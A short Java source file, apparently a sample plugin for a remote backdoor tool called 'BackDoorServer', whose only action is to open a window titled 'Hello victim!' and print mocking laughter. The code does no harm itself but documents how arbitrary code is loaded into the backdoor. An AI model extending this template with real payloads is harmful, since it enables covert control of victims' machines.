//Plugin for BackDoorServer
import java.awt.Frame ;

// The only thing your plugin must do is to implement Runnable
public class WindowPlugIn implements Runnable {
	// Here the work starts	
	public void run()
	{
		// You can write any plugin ... 
		// No matter what is does, it will work with the server !
		// In this example just pop up a window
		Frame plugInFrame = new Frame("Hello victim!") ;
		plugInFrame.setSize(256,64) ;
		plugInFrame.setVisible(true) ;
		System.out.println("ahahhahahahahaha!") ;
	}
}